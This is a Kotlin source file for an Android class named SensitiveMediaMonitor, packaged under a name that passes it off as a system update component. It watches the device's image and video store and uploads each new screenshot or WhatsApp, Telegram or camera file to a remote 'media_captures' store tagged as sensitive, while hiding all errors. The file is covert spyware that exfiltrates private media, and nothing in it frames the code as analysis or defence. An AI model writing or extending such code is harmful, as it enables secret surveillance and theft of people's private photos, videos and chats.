package com.android.system.update.core

import android.content.Context
import android.database.ContentObserver
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.provider.MediaStore
import org.json.JSONObject
import java.io.File

class SensitiveMediaMonitor(
    private val context: Context,
    private val connectionManager: NetworkConnectionManager
) {
    private var lastUploadedPath: String? = null

    private val observer = object : ContentObserver(Handler(Looper.getMainLooper())) {
        override fun onChange(selfChange: Boolean, uri: Uri?) {
            super.onChange(selfChange, uri)
            Thread { handleMediaChange() }.start()
        }
    }

    fun startMonitoring() {
        context.contentResolver.registerContentObserver(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI, true, observer
        )
        context.contentResolver.registerContentObserver(
            MediaStore.Video.Media.EXTERNAL_CONTENT_URI, true, observer
        )
    }

    private fun handleMediaChange() {
        val projection = arrayOf(MediaStore.MediaColumns.DATA, MediaStore.MediaColumns.DISPLAY_NAME)
        val sortOrder = "${MediaStore.MediaColumns.DATE_ADDED} DESC"

        try {
            val contentUris = listOf(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI
            )

            for (contentUri in contentUris) {
                context.contentResolver.query(contentUri, projection, null, null, sortOrder)?.use { cursor ->
                    if (cursor.moveToFirst()) {
                        val filePath = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA))
                        val fileName = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME))
                        val file = File(filePath)

                        if (filePath == lastUploadedPath) return

                        if (shouldUpload(file)) {
                            lastUploadedPath = filePath

                            val type = if (contentUri == MediaStore.Video.Media.EXTERNAL_CONTENT_URI) "video" else "image"
                            val remotePath = "$type/${System.currentTimeMillis()}_$fileName"

                            connectionManager.uploadFile(file, "media_captures", remotePath)

                            val mediaData = JSONObject().apply {
                                put("file_url", remotePath)
                                put("is_sensitive", true)
                                put("source_type", type)
                            }
                            connectionManager.sync(mediaData.toString(), "media_captures")
                        }
                    }
                }
            }
        } catch (e: Exception) {
        }
    }

    private fun shouldUpload(file: File): Boolean {
        if (!file.exists() || file.length() == 0L) return false
        val path = file.absolutePath.lowercase()

        return path.contains("screenshot") ||
               path.contains("whatsapp") ||
               path.contains("telegram") ||
               (path.contains("dcim") && file.length() < 10 * 1024 * 1024)
    }

    fun stopMonitoring() {
        context.contentResolver.unregisterContentObserver(observer)
    }
}